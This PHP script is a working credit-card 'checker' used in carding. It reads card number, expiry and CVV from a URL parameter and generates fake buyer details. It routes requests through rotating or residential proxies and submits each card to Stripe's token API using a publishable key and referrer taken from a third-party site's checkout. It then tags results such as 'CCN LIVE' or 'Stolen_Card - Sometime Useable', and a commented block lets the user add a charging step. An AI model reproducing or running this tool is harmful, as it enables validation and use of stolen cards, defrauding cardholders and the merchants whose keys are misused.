<?php

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function monarchproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = monarchproxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json', 
'accept-language: en-US',
'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/v3/GIQm89WqdPipo5cyACzNQ.html?distinct_id=c2579457-ed31-53a6-c808-1b1172868419',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2Fa44017d)&user_agent=Mozilla%2F5.0+(Linux%3B+Android+9%3B+vivo+1951)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F83.0.4103.96+Mobile+Safari%2F537.36&device_id=1909fec9-9c42-43c5-bb61-c7f6ae5b47f4&referrer=https%3A%2F%2Fwww.wonkette.com%2Fst%2FSubscriptions&pasted_fields=number&time_checkout_opened=1591434283&time_checkout_loaded=1591434282&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]='.$email.'&time_on_page=19461&guid=NA&muid=74b74655-dda6-4fe8-97ae-d962bd231f3b&sid=16a374b6-a6c2-426d-877b-83536f432f3f&key=pk_live_7dJjNGbMgTkHfEasr9FsLcjF');

$result = curl_exec($ch);
// $token = trim(strip_tags(getStr($result,'"id": "','"')));

////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

// $ch = curl_init();
// /////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// ////////=========Socks Proxy
// //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
// curl_setopt($ch, CURLOPT_URL, '#');
// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//   'Host: '#',    [If No Host Data On Site Dont Uncomment It]  
//   'accept: '#',
//   'content-type: #',
//   'cookie: #',   [If No Cookie Data On Site Dont Uncomment It]
//   'Origin: #',
//   'referer: #',
//   'Sec-Fetch-Mode: #',
// ));
// curl_setopt($ch, CURLOPT_POSTFIELDS, '#');

// $result = curl_exec($ch);
// $message = trim(strip_tags(getStr($result,'"message":"','"'))); 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"></span> <span class="badge badge-success"> CVV MATCHED [YourName] </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"></span> <span class="badge badge-success"> CVV MATCHED [YourName] </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"></span> <span class="badge badge-success"> CVC MATCHED [YourName] </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info"></span> <span class="badge badge-info"> CCN LIVE [YourName]</span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info"></span> <span class="badge badge-info"> CCN LIVE [YourName]/span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info"></span> <span class="badge badge-info"> CCN LIVE [YourName] </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info"></span> <span class="badge badge-info"> CCN LIVE [YourName] </span></br>';
}
elseif(strpos($result, 'incorrect_zip' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"></span> <span class="badge badge-success"> CVC MATCHED - Incorrect Zip [YourName] </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info"></span> <span class="badge badge-info"> Stolen_Card - Sometime Useable [YourName] </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info"></span> <span class="badge badge-info"> Lost_Card - Sometime Useable [YourName] </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info"></span> <span class="badge badge-info"> Insufficient Funds [YourName] </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Card Expired [YourName]</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success"></span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info"></span> <span class="badge badge-info"> Pickup Card_Card - Sometime Useable [YourName] </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Incorrect Card Number [YourName]</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Incorrect Card Number [YourName]</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Card Declined [YourName]</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Declined : Generic_Decline [YourName]</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Declined : Do_Not_Honor [YourName]</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Security Code Check : Unchecked [Proxy Dead] [YourName]</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Security Code Check : Fail [YourName]</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Expired Card [YourName]</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Card Doesnt Support This Purchase [YourName]</span> </br>';
}
 else {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red"></span> <span class="new badge red">' . $lista . '</span> <span class="new badge red"></span> <span class="badge badge-info"> Proxy Dead / Error Not Listed [YourName]</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response

///////////////////////////////////////////////===========xD========\\\\\\\\\\\\\\\
?>
